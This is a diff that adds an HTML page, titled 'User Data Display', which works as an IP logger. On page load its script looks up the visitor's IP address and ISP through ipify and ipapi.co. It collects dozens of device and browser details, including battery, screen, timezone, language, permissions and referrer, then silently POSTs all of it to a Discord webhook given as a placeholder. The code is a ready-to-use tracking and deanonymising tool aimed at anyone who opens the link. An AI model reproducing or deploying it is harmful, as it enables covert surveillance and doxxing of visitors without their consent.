@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Data Display</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .container { max-width: 800px; margin: auto; padding: 20px; }
+        h1 { text-align: center; }
+        .data { margin: 10px 0; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>User Data</h1>
+    <div class="data" id="userData"></div>
+</div>
+
+<script>
+    const webhookURL = 'WEBHOOK!';
+
+    async function fetchUserData() {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+
+        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const geoData = await geoResponse.json();
+
+        const userData = {
+            ip: ipData.ip,
+            userAgent: navigator.userAgent,
+            browserName: getBrowserName(),
+            browserVersion: getBrowserVersion(),
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            logicalScreenSize: `${window.innerWidth}x${window.innerHeight}`,
+            viewportSize: `${document.documentElement.clientWidth}x${document.documentElement.clientHeight}`,
+            os: navigator.platform,
+            deviceType: getDeviceType(),
+            isp: geoData.org || "N/A",
+            cpuCores: navigator.hardwareConcurrency || "N/A",
+            deviceMemory: navigator.deviceMemory || "N/A",
+            language: navigator.language,
+            languagePreferences: navigator.languages.join(", "),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            cookiesEnabled: navigator.cookieEnabled,
+            online: navigator.onLine,
+            memory: navigator.deviceMemory || "N/A",
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            product: navigator.product,
+            connectionType: navigator.connection ? navigator.connection.effectiveType : "N/A",
+            referrer: document.referrer || "N/A",
+            userMediaSupport: !!navigator.mediaDevices,
+            hasWebGL: !!document.createElement('canvas').getContext('webgl'),
+            hasServiceWorker: 'serviceWorker' in navigator,
+            hasGeolocation: 'geolocation' in navigator,
+            doNotTrack: navigator.doNotTrack || "N/A",
+            screenColorDepth: window.screen.colorDepth || "N/A",
+            batteryStatus: await getBatteryStatus(),
+            touchSupport: 'ontouchstart' in window ? "Supported" : "Not Supported",
+            maxTouchPoints: navigator.maxTouchPoints || "N/A",
+            orientation: window.screen.orientation ? await getOrientation() : "N/A",
+            mimeTypes: [...navigator.mimeTypes].map(mt => mt.type).join(", ") || "N/A",
+            connectionSpeed: await getConnectionSpeed(),
+            notificationsPermission: await getPermissionStatus('notifications'),
+            geolocationPermission: await getPermissionStatus('geolocation'),
+            localStorageSupport: supportsLocalStorage(),
+            sessionStorageSupport: supportsSessionStorage(),
+            indexedDBSupport: supportsIndexedDB(),
+            mediaCapabilities: await getMediaCapabilities(),
+            serviceWorkerStatus: await checkServiceWorkerStatus(),
+            prefersDarkScheme: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Yes" : "No",
+            audioCapabilities: await getAudioCapabilities(),
+            isScreenLocked: await isOrientationLocked(),
+            screenOrientation: getScreenOrientation(),
+            hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
+            connectionBandwidth: await getConnectionBandwidth(),
+            touchEvents: !!('ontouchstart' in window) ? "Supported" : "Not Supported",
+            sessionId: generateSessionId(),
+            javascriptEnabled: true,
+            fetchApiSupported: !!window.fetch,
+            webrtcSupported: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
+            clipboardApiSupported: !!navigator.clipboard,
+            batteryLevel: await getBatteryLevel()
+        };
+
+        // Display user data
+        const userDataDiv = document.getElementById('userData');
+        for (const [key, value] of Object.entries(userData)) {
+            userDataDiv.innerHTML += `<strong>${key.charAt(0).toUpperCase() + key.slice(1)}:</strong> ${value}<br>`;
+        }
+
+        // Send user data to Discord webhook
+        sendToDiscord(userData);
+    }
+
+    function getBrowserName() {
+        const userAgent = navigator.userAgent;
+        if (userAgent.includes("Firefox")) return "Firefox";
+        if (userAgent.includes("Chrome")) return "Chrome";
+        if (userAgent.includes("Safari")) return "Safari";
+        if (userAgent.includes("Edge")) return "Edge";
+        if (userAgent.includes("Opera")) return "Opera";
+        return "Unknown Browser";
+    }
+
+    function getBrowserVersion() {
+        const userAgent = navigator.userAgent;
+        const match = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)[\/\s](\d+)/);
+        return match ? match[2] : "Unknown Version";
+    }
+
+    function getDeviceType() {
+        const userAgent = navigator.userAgent;
+        if (/Mobi|Android/i.test(userAgent)) return "Mobile";
+        if (/Tablet/i.test(userAgent)) return "Tablet";
+        return "Desktop";
+    }
+
+    async function getBatteryStatus() {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            return `Level: ${battery.level * 100}%, Charging: ${battery.charging}`;
+        }
+        return "Battery info not available";
+    }
+
+    async function getBatteryLevel() {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            return `${(battery.level * 100).toFixed(0)}%`;
+        }
+        return "N/A";
+    }
+
+    async function getOrientation() {
+        return screen.orientation ? screen.orientation.type : "N/A";
+    }
+
+    async function getConnectionSpeed() {
+        return navigator.connection ? `${navigator.connection.downlink} Mbps` : "N/A";
+    }
+
+    async function getPermissionStatus(permission) {
+        if (navigator.permissions) {
+            const { state } = await navigator.permissions.query({ name: permission });
+            return state;
+        }
+        return "N/A";
+    }
+
+    function supportsLocalStorage() {
+        return typeof(Storage) !== "undefined" ? "Supported" : "Not Supported";
+    }
+
+    function supportsSessionStorage() {
+        return typeof(sessionStorage) !== "undefined" ? "Supported" : "Not Supported";
+    }
+
+    function supportsIndexedDB() {
+        return window.indexedDB ? "Supported" : "Not Supported";
+    }
+
+    async function getMediaCapabilities() {
+        if (navigator.mediaCapabilities) {
+            const capabilities = await navigator.mediaCapabilities.decodingInfo({
+                type: 'file',
+                video: { contentType: 'video/mp4', width: 1280, height: 720, bitrate: 5000000, framerate: 30 },
+            });
+            return capabilities.supported ? "Supported" : "Not Supported";
+        }
+        return "N/A";
+    }
+
+    async function getAudioCapabilities() {
+        const audio = new Audio();
+        return {
+            mp3: audio.canPlayType('audio/mpeg') ? "Supported" : "Not Supported",
+            wav: audio.canPlayType('audio/wav') ? "Supported" : "Not Supported",
+            ogg: audio.canPlayType('audio/ogg') ? "Supported" : "Not Supported"
+        };
+    }
+
+    async function isOrientationLocked() {
+        if (screen.orientation) {
+            return screen.orientation.locked ? "Yes" : "No";
+        }
+        return "N/A";
+    }
+
+    function getScreenOrientation() {
+        return screen.orientation ? screen.orientation.type : "N/A";
+    }
+
+    async function getConnectionBandwidth() {
+        return navigator.connection ? `${navigator.connection.downlinkMax} Mbps` : "N/A";
+    }
+
+    async function checkServiceWorkerStatus() {
+        return 'serviceWorker' in navigator ? "Supported" : "Not Supported";
+    }
+
+    function generateSessionId() {
+        return 'session_' + Math.random().toString(36).substr(2, 9);
+    }
+
+    async function sendToDiscord(data) {
+        const payload = {
+            content: "User Data:\n" + JSON.stringify(data, null, 2)
+        };
+
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+    }
+
+    fetchUserData();
+</script>
+
+</body>
+</html>
